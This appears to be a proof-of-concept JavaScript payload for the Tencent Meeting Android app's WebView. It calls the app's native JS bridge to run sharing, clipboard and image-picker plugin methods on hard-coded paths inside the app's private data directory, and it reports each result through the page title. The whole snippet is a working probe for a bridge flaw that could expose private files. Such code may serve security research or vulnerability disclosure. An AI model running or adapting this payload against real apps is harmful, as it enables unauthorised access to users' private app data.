(function(){
  document.title='P139TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P139CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P139TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P139TB-NOMGR:'+location.host;return}
  var zip='/data/user/0/com.tencent.wemeet.app/files/Global/Data/WebViewShare/5b0dd3209b376a05fc0678d96fb4c27c/6aede786b613dd5a2c7f0f810c71b2ea';
  var zip2='/data/user/0/com.tencent.wemeet.app/files/Global/Data/WebViewShare/5b0dd3209b376a05fc0678d96fb4c27c/会议笔记_p59_123456789.';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['OS','CommonPlugin','OpenShareBoard',{
      path:zip, file_path:zip, url:zip, image_url:zip, shareCallbackMethod:'window.__p',
      share_type:'image', image_third_app_share_url:zip
    }],
    ['CI','CommonPlugin','ChooseImage',{path:zip, file_path:zip, url:zip, count:1, sourceType:['album']}],
    ['SC','CommonPlugin','SetImageToClipboard',{path:zip, file_path:zip, url:zip, image_url:zip, image:zip}],
    ['SS','Sharing','ShareContent',{path:zip, file_path:zip, url:zip, content:zip, type:'file'}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P139TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P139-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
